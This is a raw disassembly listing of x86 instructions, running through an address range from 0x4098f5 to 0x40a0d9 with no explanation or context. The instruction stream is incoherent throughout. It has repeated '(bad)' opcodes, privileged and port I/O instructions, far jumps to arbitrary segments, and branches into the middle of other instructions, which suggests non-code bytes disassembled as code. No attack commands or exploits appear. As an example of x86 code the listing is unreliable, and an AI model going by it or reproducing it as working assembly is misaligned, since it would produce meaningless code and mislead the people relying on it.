  4098f5:	pop    esp
  4098f6:	inc    ebx
  4098f7:	fsub   DWORD PTR [ebp+ebx*8+0x24a6c1fd]
  4098fe:	cmp    BYTE PTR [ebp+0xe],dl
  409901:	dec    esp
  409902:	outs   dx,BYTE PTR ds:[esi]
  409903:	sub    al,0xe2
  409905:	jbe    0x4098ae
  409907:	add    BYTE PTR [esi+0x7],bh
  40990a:	push   0xdd95583c
  40990f:	pop    eax
  409910:	mov    ds:0x9bd24d9e,al
  409915:	xchg   ebx,eax
  409916:	sub    al,0xc2
  409918:	hlt    
  409919:	enter  0x1d76,0xc7
  40991d:	outs   dx,BYTE PTR ds:[si]
  40991f:	fld    DWORD PTR [eax]
  409921:	xchg   BYTE PTR [esi+0x19],bl
  409924:	jb     0x4098db
  409926:	jmp    0x9e45:0xd1a66321
  40992d:	jmp    0x2d4f87ee
  409932:	cmp    ebp,0xbe44c5a1
  409938:	(bad)  
  409939:	data16 mov cl,0x59
  40993c:	add    ebx,DWORD PTR [ebp-0x7f]
  40993f:	loop   0x40992d
  409941:	mov    esi,0x3c797598
  409946:	stos   BYTE PTR es:[edi],al
  409947:	or     al,0x2b
  409949:	sub    al,0xdc
  40994b:	int3   
  40994c:	add    al,0x22
  40994e:	jecxz  0x40990d
  409950:	outs   dx,DWORD PTR ds:[esi]
  409951:	ins    DWORD PTR es:[edi],dx
  409952:	and    dh,BYTE PTR [edx+0x7c]
  409955:	jge    0x40994a
  409957:	jae    0x4099c4
  409959:	cmp    esi,DWORD PTR ds:0xfce2f5f6
  40995f:	sbb    BYTE PTR [edi+0x1e],cl
  409962:	(bad)  
  409963:	cmc    
  409964:	in     eax,dx
  409965:	sbb    DWORD PTR [esi],ebx
  409967:	dec    esi
  409968:	cmc    
  409969:	jmp    0x3e67d182
  40996e:	rcl    BYTE PTR [eax],0x50
  409971:	inc    ecx
  409972:	push   edi
  409973:	mov    DWORD PTR [eax+ebp*8+0x55],ecx
  409977:	das    
  409978:	test   DWORD PTR [edx-0x13ddf40d],esi
  40997e:	idiv   BYTE PTR ds:0x7cbd5aff
  409984:	xchg   edi,eax
  409985:	xor    eax,0xc71da539
  40998a:	adc    DWORD PTR [ebx],edx
  40998c:	jl     0x40990f
  40998e:	sbb    dh,BYTE PTR ds:0xfd19cbc9
  409994:	out    0xe7,al
  409996:	loop   0x409977
  409998:	imul   edx,DWORD PTR [edx+0x46ad7669],0x44
  40999f:	stos   DWORD PTR es:[edi],eax
  4099a0:	js     0x409953
  4099a2:	push   0xffffffa5
  4099a4:	dec    esi
  4099a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099a6:	and    eax,0xbb47633b
  4099ab:	ror    DWORD PTR ds:[ebp+ecx*4-0x19],1
  4099b0:	jnp    0x409996
  4099b2:	fwait
  4099b3:	out    dx,al
  4099b4:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4099b6:	sbb    DWORD PTR [ebp-0x70806620],ebx
  4099bc:	pop    edi
  4099bd:	in     eax,dx
  4099be:	mov    bl,0xe0
  4099c0:	in     al,dx
  4099c1:	push   ebx
  4099c2:	hlt    
  4099c3:	adc    BYTE PTR [edx+esi*4-0x2e],cl
  4099c7:	aas    
  4099c8:	mov    eax,ds:0xb019fab8
  4099cd:	xchg   esp,eax
  4099ce:	jmp    0x4099d2
  4099d0:	aaa    
  4099d1:	ss sbb edi,0xfffffff9
  4099d5:	and    eax,0xbe56081c
  4099da:	call   0xd61e:0xb3f3676d
  4099e1:	out    dx,al
  4099e2:	sbb    DWORD PTR [eax+0x23],esi
  4099e5:	int3   
  4099e6:	sbb    DWORD PTR [esi-0x22085671],ebp
  4099ec:	outs   dx,DWORD PTR ds:[esi]
  4099ed:	clc    
  4099ee:	pop    ss
  4099ef:	loopne 0x4099a7
  4099f1:	adc    eax,0x62c235b7
  4099f6:	pusha  
  4099f7:	(bad)  
  4099f8:	(bad)  ds:0x10f0bfb2
  4099fe:	call   0x56d2:0x1e560234
  409a05:	mov    ebx,edi
  409a07:	popa   
  409a08:	sub    bh,BYTE PTR [eax-0x45627c54]
  409a0e:	lea    esp,[edi]
  409a10:	je     0x409a7f
  409a12:	(bad)  
  409a13:	cs jg  0x4099c4
  409a16:	aaa    
  409a17:	ja     0x4099f7
  409a19:	lea    ebp,[esi+0x3]
  409a1c:	out    dx,eax
  409a1d:	test   DWORD PTR [ebp-0x58],edx
  409a20:	jnp    0x4099a7
  409a22:	cdq    
  409a23:	xchg   edi,eax
  409a24:	in     al,dx
  409a25:	push   cs
  409a26:	in     al,dx
  409a27:	loop   0x409a02
  409a29:	push   esi
  409a2a:	ds mov ch,0xd5
  409a2d:	in     al,0xba
  409a2f:	aaa    
  409a30:	push   esi
  409a31:	push   0x33
  409a33:	cdq    
  409a34:	jnp    0x4099f5
  409a36:	lahf   
  409a37:	and    ebx,ebx
  409a39:	push   ss
  409a3a:	bound  edx,QWORD PTR ds:[esi-0x55b65925]
  409a41:	arpl   WORD PTR [edx+0x5bbcfa2],cx
  409a47:	loop   0x409aa0
  409a49:	leave  
  409a4a:	test   DWORD PTR [eax+0x49],ebp
  409a4d:	popf   
  409a4e:	sti    
  409a4f:	popa   
  409a50:	aam    0xbb
  409a52:	and    eax,0x5de9cd75
  409a57:	inc    esp
  409a58:	fistp  QWORD PTR [ebp+ebp*1+0x2d]
  409a5c:	xchg   ebp,eax
  409a5d:	adc    eax,0x533fb2ba
  409a62:	add    ecx,DWORD PTR [ebx-0x3879ebe]
  409a68:	into   
  409a69:	xor    ah,dh
  409a6b:	in     eax,0x3c
  409a6d:	push   esi
  409a6e:	jbe    0x409ace
  409a70:	test   DWORD PTR [edx+edx*8-0x49],esi
  409a74:	arpl   di,dx
  409a76:	pop    ebp
  409a77:	dec    eax
  409a78:	add    al,0xd3
  409a7a:	xor    ecx,DWORD PTR [edi+0x39adace3]
  409a80:	mov    WORD PTR [ebp-0x1e3b1b2a],ds
  409a86:	sbb    eax,0x5625f6c9
  409a8b:	push   ebp
  409a8c:	mov    ds:0xe832614b,al
  409a91:	mov    ebp,0xccb791d0
  409a96:	call   0xba7b:0x2d01ecce
  409a9d:	out    dx,al
  409a9e:	mov    ds:0xe86cf1bb,eax
  409aa3:	je     0x409ad5
  409aa5:	pop    esp
  409aa6:	sbb    DWORD PTR [ecx],edi
  409aa8:	inc    edx
  409aa9:	repz mov WORD PTR [edi],gs
  409aac:	shl    al,1
  409aae:	pop    ecx
  409aaf:	mov    ds:0x56f3a281,al
  409ab4:	pop    es
  409ab5:	mov    cl,0xda
  409ab7:	(bad)  
  409ab8:	fldenv [edx]
  409aba:	jnp    0x409b3b
  409abc:	rdtsc  
  409abe:	icebp  
  409abf:	push   es
  409ac0:	push   esi
  409ac1:	(bad)  
  409ac2:	sub    DWORD PTR [eax],edi
  409ac4:	arpl   si,sp
  409ac6:	pusha  
  409ac7:	mov    cl,0x5e
  409ac9:	call   0xd110:0x22368a73
  409ad0:	and    eax,DWORD PTR [ecx]
  409ad2:	dec    ebp
  409ad3:	cs mov edi,0x4bd4a0c2
  409ad9:	mov    ebx,0x5939f3ab
  409ade:	cmp    eax,0xb3b2a574
  409ae3:	fwait
  409ae4:	retf   
  409ae5:	cdq    
  409ae6:	mov    edi,0xac6bd4a3
  409aeb:	iret   
  409aec:	loopne 0x409a70
  409aee:	out    dx,al
  409aef:	ss mov cl,0x82
  409af2:	ins    BYTE PTR es:[edi],dx
  409af3:	(bad)  
  409af4:	jge    0x409b12
  409af6:	shl    DWORD PTR [edi],1
  409af8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409af9:	jl     0x409b44
  409afb:	mov    ecx,0xed89b83b
  409b00:	add    eax,0x9ac519f4
  409b05:	cmc    
  409b06:	mov    edx,0xd724da59
  409b0b:	shr    DWORD PTR [edx+0x33],1
  409b0e:	aam    0xc1
  409b10:	mov    al,BYTE PTR [edx-0xb]
  409b13:	inc    esp
  409b14:	cmp    ebx,DWORD PTR [edi+0x6696b6be]
  409b1a:	jp     0x409b4d
  409b1c:	repnz inc esp
  409b1e:	fwait
  409b1f:	add    BYTE PTR [edi],bl
  409b21:	mov    al,0xc7
  409b23:	sbb    BYTE PTR [ebp+0x4f90135],dh
  409b29:	and    al,0x84
  409b2b:	cmp    al,0x63
  409b2d:	xchg   edi,eax
  409b2e:	sti    
  409b2f:	xchg   edi,eax
  409b30:	mov    ah,0x18
  409b32:	stos   DWORD PTR es:[edi],eax
  409b33:	stos   BYTE PTR es:[edi],al
  409b34:	(bad)  
  409b35:	cwde   
  409b36:	jmp    0xd26270c2
  409b3b:	mov    edx,0xa3df39e7
  409b40:	inc    esp
  409b41:	mov    eax,0xa3e3e4ec
  409b46:	inc    ebx
  409b47:	sub    ebp,esp
  409b49:	adc    esi,esp
  409b4b:	and    DWORD PTR [ebx],0x304b4276
  409b51:	adc    eax,0x8666095a
  409b56:	icebp  
  409b57:	jne    0x409b38
  409b59:	daa    
  409b5a:	rcr    BYTE PTR [ecx+edx*2-0x58],0x29
  409b5f:	aad    0x58
  409b61:	mov    cl,0x21
  409b63:	leave  
  409b64:	int3   
  409b65:	cs push ds
  409b67:	icebp  
  409b68:	das    
  409b69:	mov    ecx,gs
  409b6b:	in     al,0xa9
  409b6d:	inc    esi
  409b6e:	ds xchg esp,eax
  409b70:	adc    ecx,DWORD PTR [eax-0x674df100]
  409b76:	mov    WORD PTR [ebp*1+0x668b12c7],?
  409b7d:	inc    edx
  409b7e:	test   DWORD PTR [ebx+0xdd9b5c6],ebp
  409b84:	in     eax,0x9d
  409b86:	fdivr  st,st(4)
  409b88:	and    BYTE PTR [ecx],dh
  409b8a:	icebp  
  409b8b:	cdq    
  409b8c:	xchg   DWORD PTR [ebp-0x2c],edi
  409b8f:	imul   esp,DWORD PTR [eax-0x39ad6192],0xcd2d2494
  409b99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b9a:	jge    0x409bf9
  409b9c:	mov    al,0xbd
  409b9e:	xchg   edi,eax
  409b9f:	jge    0x409c07
  409ba1:	and    al,0xde
  409ba3:	push   0x3f37905c
  409ba8:	sub    bl,bh
  409baa:	mov    ebp,0x75375b29
  409baf:	or     eax,DWORD PTR [eax-0x76fb302a]
  409bb5:	pop    esi
  409bb6:	xor    al,al
  409bb8:	fcom   DWORD PTR [eax-0x128092d3]
  409bbe:	pop    edx
  409bbf:	or     ah,BYTE PTR [eax+0x646bad58]
  409bc5:	not    DWORD PTR [eax+0x1cae62ee]
  409bcb:	xchg   esi,eax
  409bcc:	inc    ah
  409bce:	mov    cs,WORD PTR [esp+edx*4-0x1f]
  409bd2:	dec    eax
  409bd3:	dec    edx
  409bd4:	inc    ecx
  409bd5:	or     dh,ch
  409bd7:	pop    esp
  409bd8:	push   0x3f46e877
  409bdd:	mov    esi,0xfc5381ee
  409be2:	ret    
  409be3:	pop    esp
  409be4:	stc    
  409be5:	data16 sub al,BYTE PTR gs:[edi+ecx*8]
  409bea:	or     eax,eax
  409bec:	mov    ah,ah
  409bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bef:	test   BYTE PTR [ebp-0x64],dh
  409bf2:	loopne 0x409be3
  409bf4:	push   ds
  409bf5:	and    ecx,DWORD PTR [ebp-0x59]
  409bf8:	std    
  409bf9:	sub    eax,DWORD PTR [edi]
  409bfb:	jmp    0x7855:0x307369af
  409c02:	aas    
  409c03:	repnz sar BYTE PTR [ecx+esi*1+0x2a77a14],0x3a
  409c0c:	jmp    0x409c02
  409c0e:	cmp    al,0xcf
  409c10:	imul   edx,DWORD PTR [eax],0x2c
  409c13:	fs ss push edi
  409c16:	sub    edi,DWORD PTR ds:0x5c3df892
  409c1c:	mov    al,ds:0xf63d71c1
  409c21:	(bad)  
  409c22:	mov    ds:0x3fd60f0b,al
  409c27:	pop    ds
  409c28:	pop    edi
  409c29:	mov    eax,ds:0xb6023e6a
  409c2e:	dec    esp
  409c2f:	ins    BYTE PTR es:[edi],dx
  409c30:	hlt    
  409c31:	xchg   ecx,eax
  409c32:	(bad)  [ecx-0x41]
  409c35:	(bad)  
  409c37:	sub    al,BYTE PTR [edx+0x7a]
  409c3a:	pop    esi
  409c3b:	xor    DWORD PTR [ebx-0x248ca7fb],0xd4199218
  409c45:	aaa    
  409c46:	xor    DWORD PTR [ecx],0xc59617a2
  409c4c:	sar    BYTE PTR [eax+0x49299e79],1
  409c52:	xchg   esi,eax
  409c53:	push   eax
  409c54:	mov    ebp,?
  409c56:	mov    edi,edi
  409c58:	cmp    eax,DWORD PTR [eax]
  409c5a:	dec    esp
  409c5b:	icebp  
  409c5c:	pusha  
  409c5d:	fst    QWORD PTR [ebx]
  409c5f:	outs   dx,WORD PTR ds:[esi]
  409c61:	dec    edx
  409c62:	jbe    0x409cb2
  409c64:	pop    es
  409c65:	sub    esp,DWORD PTR [esi+eax*4]
  409c68:	sub    DWORD PTR gs:[edx+0x3],eax
  409c6c:	mov    bh,BYTE PTR [ecx]
  409c6e:	xor    al,0x2a
  409c70:	pop    ebp
  409c71:	inc    ecx
  409c72:	(bad)
  409c75:	shl    BYTE PTR [eax-0x2cc5ff79],1
  409c7b:	push   0xffffffb4
  409c7d:	cmp    bl,ch
  409c7f:	and    al,0x5f
  409c81:	cwde   
  409c82:	and    ch,ah
  409c84:	mov    ebx,0x780a9
  409c89:	test   eax,0x80ca7ed0
  409c8e:	mov    dl,0xcd
  409c90:	lods   eax,DWORD PTR ds:[esi]
  409c91:	(bad)  
  409c92:	mov    ah,0x29
  409c94:	mov    eax,ds:0x8f9774fa
  409c99:	sbb    al,0xc1
  409c9b:	mov    al,ds:0xb669948b
  409ca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ca1:	retf   0x5b51
  409ca4:	mov    esp,0xd7c2cabc
  409ca9:	imul   edi,DWORD PTR [eax],0x27
  409cac:	mov    al,ds:0x391f5325
  409cb1:	dec    ebx
  409cb2:	mov    ah,0x61
  409cb4:	mov    DWORD PTR [eax-0x3214150d],eax
  409cba:	test   eax,0x8436d1c1
  409cbf:	sbb    eax,0x4b51f8e7
  409cc4:	push   DWORD PTR [esi-0x7c]
  409cc7:	aaa    
  409cc8:	jno    0x409ccd
  409cca:	idiv   BYTE PTR [eax+ebx*4+0x5d]
  409cce:	(bad)  
  409ccf:	sti    
  409cd0:	ret    
  409cd1:	mov    ah,0xbe
  409cd3:	and    DWORD PTR [edx],0x9d7eee58
  409cd9:	outs   dx,DWORD PTR ds:[esi]
  409cda:	add    DWORD PTR [ebp-0x6fed7204],ecx
  409ce0:	push   ebx
  409ce1:	test   eax,0x2db8b356
  409ce6:	fbstp  TBYTE PTR [ebx]
  409ce8:	xchg   edi,eax
  409ce9:	(bad)  
  409cea:	xchg   BYTE PTR [edx],bh
  409cec:	add    eax,0xb8c53c34
  409cf1:	es leave 
  409cf3:	in     al,0x8c
  409cf5:	jle    0x409d74
  409cf7:	shl    DWORD PTR [esi+0x4cae78bb],1
  409cfd:	mov    esp,0xeb1ee50d
  409d02:	pushf  
  409d03:	ret    0xf264
  409d06:	enter  0xe924,0x36
  409d0a:	lods   eax,DWORD PTR ds:[esi]
  409d0b:	les    esp,FWORD PTR [esp+ebx*1+0x5ca864f5]
  409d12:	inc    ecx
  409d13:	in     eax,dx
  409d14:	inc    esi
  409d15:	jp     0x409cfe
  409d17:	jg     0x409d83
  409d19:	call   0x6bfb:0xf6eedb66
  409d20:	sub    al,0x7
  409d22:	(bad)
  409d26:	popf   
  409d27:	cmp    eax,0x3e1ad118
  409d2c:	add    BYTE PTR [esi+0x34],al
  409d2f:	shr    BYTE PTR [edx+0x5421f000],1
  409d35:	add    DWORD PTR ds:0xb1d22fd3,esp
  409d3b:	mov    esp,0x1080c60a
  409d40:	in     eax,0x5c
  409d42:	xor    esp,edi
  409d44:	jmp    0x409dab
  409d46:	dec    ecx
  409d47:	jg     0x409dc0
  409d49:	xchg   ecx,eax
  409d4a:	xor    al,0x99
  409d4c:	xchg   esp,eax
  409d4d:	inc    ebp
  409d4e:	ffreep st(3)
  409d50:	test   DWORD PTR [ebx+0x62],ebp
  409d53:	jb     0x409dcc
  409d55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d56:	addr16 jb 0x409d9d
  409d59:	ins    DWORD PTR es:[edi],dx
  409d5a:	addr16 mov eax,ds:0x5905
  409d5e:	jmp    0xadc7a873
  409d63:	inc    edi
  409d64:	mov    ah,0xdb
  409d66:	xor    eax,0x2a311f2c
  409d6b:	ins    BYTE PTR es:[edi],dx
  409d6c:	mov    al,ds:0xbe81d316
  409d71:	push   ss
  409d72:	ret    
  409d73:	push   cs
  409d74:	sbb    ah,dh
  409d76:	fimul  WORD PTR [edx-0x46a56efe]
  409d7c:	fwait
  409d7d:	adc    BYTE PTR [edx-0x7e],0x53
  409d81:	inc    ecx
  409d82:	or     esi,DWORD PTR [ecx+0x4d3d116d]
  409d88:	lods   eax,DWORD PTR ds:[esi]
  409d89:	xchg   ecx,eax
  409d8a:	jno    0x409d6d
  409d8c:	or     eax,0x409a703b
  409d91:	xor    BYTE PTR ds:0xeb415302,bl
  409d97:	sub    DWORD PTR [eax],edx
  409d99:	ficom  DWORD PTR [eax]
  409d9b:	or     edx,DWORD PTR [esi-0x68]
  409d9e:	cmp    edx,DWORD PTR [edi+0x2e50110e]
  409da4:	cmp    dh,BYTE PTR [esi-0x48]
  409da7:	dec    edx
  409da8:	push   esi
  409da9:	cmp    al,0x74
  409dab:	lea    ecx,[ebx+0x28a2db1f]
  409db1:	adc    eax,0x12c2c386
  409db6:	pop    ss
  409db7:	cmp    ebx,DWORD PTR [ebx]
  409db9:	pop    ds
  409dba:	jns    0x409d53
  409dbc:	sub    al,bl
  409dbe:	test   al,0x41
  409dc0:	ins    BYTE PTR es:[edi],dx
  409dc1:	push   0xfffffffa
  409dc3:	in     al,dx
  409dc4:	adc    DWORD PTR [edi-0xdfbc9f3],ecx
  409dca:	js     0x409d8b
  409dcc:	jg     0x409deb
  409dce:	pop    edx
  409dcf:	xchg   edx,eax
  409dd0:	ficom  DWORD PTR [eax+0x7a8ac4f7]
  409dd6:	je     0x409da4
  409dd8:	adc    bh,bl
  409dda:	mov    al,0x99
  409ddc:	das    
  409ddd:	jne    0x409d87
  409ddf:	gs mov dh,0x46
  409de2:	aaa    
  409de3:	lea    ebp,[ebx]
  409de5:	add    eax,0x4dbad8b2
  409dea:	call   0xd05b4c8a
  409def:	(bad)  
  409df0:	jmp    0x409dd7
  409df2:	cld    
  409df3:	in     eax,0x36
  409df5:	dec    ebp
  409df6:	mov    esi,esp
  409df8:	pop    gs
  409dfa:	adc    ebx,0xffffff96
  409dfd:	lods   al,BYTE PTR ds:[esi]
  409dfe:	jmp    0x409da9
  409e00:	and    DWORD PTR [edi+0x33],ebx
  409e03:	nop
  409e04:	test   ah,dh
  409e06:	iret   
  409e07:	or     ebp,edx
  409e09:	int    0x9b
  409e0b:	test   DWORD PTR [eax],esi
  409e0d:	xlat   BYTE PTR ds:[ebx]
  409e0e:	dec    edi
  409e0f:	scas   eax,DWORD PTR es:[edi]
  409e10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e11:	mov    edi,0x2d4ee849
  409e16:	pop    ebp
  409e17:	cli    
  409e18:	scas   eax,DWORD PTR es:[edi]
  409e19:	and    DWORD PTR [eax],ebx
  409e1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e1c:	adc    BYTE PTR [ebp-0x67fef545],ah
  409e22:	add    al,0xc3
  409e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e25:	shl    DWORD PTR [ecx-0x23],cl
  409e28:	sbb    al,0x81
  409e2a:	rcr    DWORD PTR [edi+0x15],1
  409e2d:	loop   0x409e57
  409e2f:	(bad)  
  409e30:	xor    ah,BYTE PTR [ebp-0x7b]
  409e33:	iret   
  409e34:	or     BYTE PTR [ecx-0x10],dh
  409e37:	ficomp DWORD PTR [edx-0x61bc3086]
  409e3d:	test   esp,edi
  409e3f:	repnz add ah,BYTE PTR [esi+edx*1+0x4a]
  409e44:	mov    edi,0xf1796b61
  409e49:	xor    dh,BYTE PTR [edx-0x59]
  409e4c:	xchg   ebx,eax
  409e4d:	sbb    al,BYTE PTR ds:0xcc565616
  409e53:	outs   dx,BYTE PTR ds:[esi]
  409e54:	sub    ah,BYTE PTR [edx-0x68]
  409e57:	fs ret 0xe2de
  409e5b:	fcmovu st,st(5)
  409e5d:	xchg   BYTE PTR [eax],ch
  409e5f:	rol    esi,0xd5
  409e62:	xchg   ebx,eax
  409e63:	daa    
  409e64:	scas   al,BYTE PTR es:[edi]
  409e65:	add    ebx,DWORD PTR [edx-0x3b]
  409e68:	pop    eax
  409e69:	cmp    DWORD PTR [edx+0x5617edd0],eax
  409e6f:	mov    ds:0xa76ba7e3,al
  409e74:	and    bl,ah
  409e76:	pop    ebx
  409e77:	addr16 xor eax,0xab3b943
  409e7d:	pop    edi
  409e7e:	add    eax,0x107604de
  409e83:	daa    
  409e84:	sub    eax,0xb2a49f7d
  409e89:	xlat   BYTE PTR ds:[ebx]
  409e8a:	push   ss
  409e8b:	lock adc eax,0x3adcd638
  409e91:	xor    eax,0x3e56cabb
  409e96:	fist   WORD PTR [edx-0x62ff201c]
  409e9c:	das    
  409e9d:	imul   esp,ebx,0x38856d25
  409ea3:	les    esi,FWORD PTR ds:0x15d9baa3
  409ea9:	mov    dh,0xf9
  409eab:	jl     0x409ee4
  409ead:	lahf   
  409eae:	mov    BYTE PTR [ecx-0x77],dh
  409eb1:	sub    ecx,DWORD PTR [esi-0x7aac02a8]
  409eb7:	add    edi,DWORD PTR [eax]
  409eb9:	pop    edi
  409eba:	int    0x88
  409ebc:	ins    BYTE PTR es:[edi],dx
  409ebd:	arpl   bx,di
  409ebf:	inc    esi
  409ec0:	shr    BYTE PTR [edx+0x473c34e2],1
  409ec6:	loop   0x409e8c
  409ec8:	add    eax,0xb892ca3d
  409ecd:	and    ch,BYTE PTR [esp+edx*8-0x619b1f68]
  409ed4:	mov    ebp,0xf8c44a5a
  409ed9:	jmp    0xf877:0x6789f1a6
  409ee0:	std    
  409ee1:	push   ss
  409ee2:	pop    edi
  409ee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ee4:	jo     0x409e79
  409ee6:	ins    DWORD PTR es:[edi],dx
  409ee7:	inc    esi
  409ee8:	stos   BYTE PTR es:[edi],al
  409ee9:	or     DWORD PTR [esi+0x6ec4e2e2],0x541a2cc1
  409ef3:	dec    ecx
  409ef4:	jo     0x409f6f
  409ef6:	lds    ecx,FWORD PTR [edx-0x2c]
  409ef9:	ret    0x17f
  409efc:	retf   0x22b8
  409eff:	je     0x409f70
  409f01:	jae    0x409eb6
  409f03:	inc    edx
  409f04:	push   edi
  409f05:	dec    ecx
  409f06:	test   DWORD PTR [edx],esp
  409f08:	mov    dl,0x9f
  409f0a:	enter  0xcb62,0x22
  409f0e:	mov    ebp,0xbe25c429
  409f13:	push   esp
  409f14:	hlt    
  409f15:	shl    ch,0x5e
  409f18:	repz mov dl,0xc0
  409f1b:	cmp    eax,0x52e036b2
  409f20:	adc    dh,BYTE PTR [ecx+0x75d87f6d]
  409f26:	outs   dx,BYTE PTR ds:[esi]
  409f27:	push   ecx
  409f28:	mov    bh,0x62
  409f2a:	ror    DWORD PTR [ecx+0x7ff45bc5],cl
  409f30:	pop    ds
  409f31:	dec    edx
  409f32:	and    BYTE PTR [edi+0x14cf178c],0x21
  409f39:	pop    esi
  409f3a:	pop    esp
  409f3b:	daa    
  409f3c:	imul   edx,DWORD PTR [edx-0x6758eb57],0x12504717
  409f46:	jb     0x409f70
  409f48:	ss push edi
  409f4a:	mov    BYTE PTR [bp+si],0xfc
  409f4e:	ret    
  409f4f:	inc    edx
  409f50:	sbb    ah,BYTE PTR [eax-0x3224e6d9]
  409f56:	call   0xe778:0x747b7b5e
  409f5d:	scas   eax,DWORD PTR es:[edi]
  409f5e:	dec    edx
  409f5f:	les    esi,FWORD PTR [edi+0x8ca22c0]
  409f65:	mov    edi,ds
  409f67:	data16 inc dx
  409f6a:	sahf   
  409f6b:	xchg   ecx,eax
  409f6c:	loop   0x409fb6
  409f6e:	or     eax,0xe5bcc6cd
  409f73:	push   ds
  409f74:	dec    ecx
  409f75:	inc    ebp
  409f76:	pop    ss
  409f77:	jnp    0x409fd6
  409f79:	pop    ebp
  409f7a:	addr16 adc eax,0x759e6fa4
  409f80:	sbb    BYTE PTR ds:0xd802cb3d,dl
  409f86:	fbld   TBYTE PTR [esi-0x3284d35a]
  409f8c:	add    eax,0x2d734f46
  409f91:	or     edi,ebx
  409f93:	inc    esp
  409f94:	sbb    al,0xad
  409f96:	pop    ecx
  409f97:	dec    ecx
  409f98:	jecxz  0x40a015
  409f9a:	js     0x409f5d
  409f9c:	iret   
  409f9d:	pop    ebp
  409f9e:	push   ds
  409f9f:	mov    ah,0x55
  409fa1:	call   0x8eeb8bb3
  409fa6:	xchg   ebx,eax
  409fa7:	pop    ss
  409fa8:	mov    ds:0xfa5a9cc5,eax
  409fad:	push   edx
  409fae:	jmp    0xe18ecc75
  409fb3:	adc    edx,eax
  409fb5:	add    BYTE PTR [esi+0x7c],0x88
  409fb9:	mov    ecx,0xd94738ba
  409fbe:	adc    cl,dh
  409fc0:	dec    ecx
  409fc1:	push   ebp
  409fc2:	cmp    DWORD PTR [ebx+0x76],0xe238b203
  409fc9:	pcmpeqw mm7,QWORD PTR [eax+0x12]
  409fcd:	mov    bl,0xd2
  409fcf:	mov    ds:0xb189d037,eax
  409fd4:	add    al,0x88
  409fd6:	adc    DWORD PTR [eax],ecx
  409fd8:	xchg   cl,al
  409fda:	inc    eax
  409fdb:	mov    ?,WORD PTR [edi+0x5b58ca14]
  409fe1:	(bad)  
  409fe2:	sbb    DWORD PTR [ecx+0x6b],ecx
  409fe5:	and    bh,bh
  409fe7:	dec    ebp
  409fe8:	jmp    0x40a068
  409fea:	sbb    eax,0xced3b303
  409fef:	gs push edi
  409ff1:	lds    esp,FWORD PTR [edi+0x24]
  409ff4:	dec    ebp
  409ff5:	adc    eax,0xb3b6c3ff
  409ffa:	sub    al,0x69
  409ffc:	fnstenv [esi]
  409ffe:	adc    dl,BYTE PTR [eax+eax*1-0x46]
  40a002:	jl     0x40a030
  40a004:	mov    bh,0xfd
  40a006:	mov    ds:0x4f5ab3a0,eax
  40a00b:	test   al,0x2
  40a00d:	add    DWORD PTR [esi+0x77edb746],edi
  40a013:	jle    0x409fe3
  40a015:	push   edi
  40a016:	mov    ds:0xb3773e87,al
  40a01b:	dec    edi
  40a01c:	jo     0x409fed
  40a01e:	(bad)  
  40a01f:	std    
  40a020:	outs   dx,BYTE PTR ds:[esi]
  40a021:	stos   DWORD PTR es:[edi],eax
  40a022:	les    ebp,FWORD PTR [ebx-0x400fc614]
  40a028:	jecxz  0x40a009
  40a02a:	fst    QWORD PTR [ecx]
  40a02c:	es ins DWORD PTR es:[edi],dx
  40a02e:	shr    BYTE PTR [eax+0x64],1
  40a031:	xor    eax,0xb47e8fc9
  40a036:	test   DWORD PTR [esi-0x48],eax
  40a039:	outs   dx,BYTE PTR ds:[esi]
  40a03a:	or     bl,BYTE PTR [edx-0x79a75042]
  40a040:	pop    esp
  40a041:	xchg   edx,eax
  40a042:	pop    es
  40a043:	imul   BYTE PTR [ebp+0x557b5acb]
  40a049:	test   eax,0x5d6b5c09
  40a04e:	lods   eax,DWORD PTR ds:[esi]
  40a04f:	fld    TBYTE PTR [esi-0x47]
  40a052:	or     al,0x26
  40a054:	daa    
  40a055:	sub    ah,BYTE PTR [eax+0x4f]
  40a058:	test   al,ah
  40a05a:	jecxz  0x409fdf
  40a05c:	in     al,0x1c
  40a05e:	jecxz  0x40a027
  40a060:	or     bl,BYTE PTR [ecx+0x5d4a258d]
  40a066:	das    
  40a067:	sbb    al,0xcb
  40a069:	(bad)  
  40a06a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a06b:	sbb    DWORD PTR [esi-0x2aa508bc],0x104f04be
  40a075:	sub    eax,0x5cd70792
  40a07a:	push   ebp
  40a07b:	cmp    edi,DWORD PTR [eax-0x75]
  40a07e:	and    ebx,DWORD PTR [eax]
  40a080:	or     al,BYTE PTR [eax-0x543232a7]
  40a086:	mov    al,ds:0x880364a5
  40a08b:	leave  
  40a08c:	sub    DWORD PTR [edx+0x23ccb732],0xfffffffd
  40a093:	imul   DWORD PTR [esi]
  40a095:	stos   DWORD PTR es:[edi],eax
  40a096:	ins    DWORD PTR es:[edi],dx
  40a097:	add    BYTE PTR [ebp-0x60],0xa0
  40a09b:	add    DWORD PTR [edi-0x6ae6ccdc],0x31629881
  40a0a5:	in     al,dx
  40a0a6:	pop    esi
  40a0a7:	retf   0xd0b7
  40a0aa:	pop    DWORD PTR [ecx-0x724ccc68]
  40a0b0:	xor    eax,esi
  40a0b2:	je     0x40a0ef
  40a0b4:	iret   
  40a0b5:	lods   al,BYTE PTR ds:[esi]
  40a0b6:	jecxz  0x40a05e
  40a0b8:	xchg   BYTE PTR [ecx+0x44],ah
  40a0bb:	(bad)  
  40a0bc:	mov    BYTE PTR [esi],dh
  40a0be:	sbb    eax,0xa35c0ee9
  40a0c3:	sub    cl,BYTE PTR [ebx+0x29]
  40a0c6:	enter  0xfe5c,0x4
  40a0ca:	and    DWORD PTR [eax+0x7caa8c1],0xffffffc5
  40a0d1:	pusha  
  40a0d2:	adc    al,0x82
  40a0d4:	lahf   
  40a0d5:	(bad)  
  40a0d6:	fild   WORD PTR [esi]
  40a0d8:	inc    eax
  40a0d9:	mov    esi,0xc851dbc9
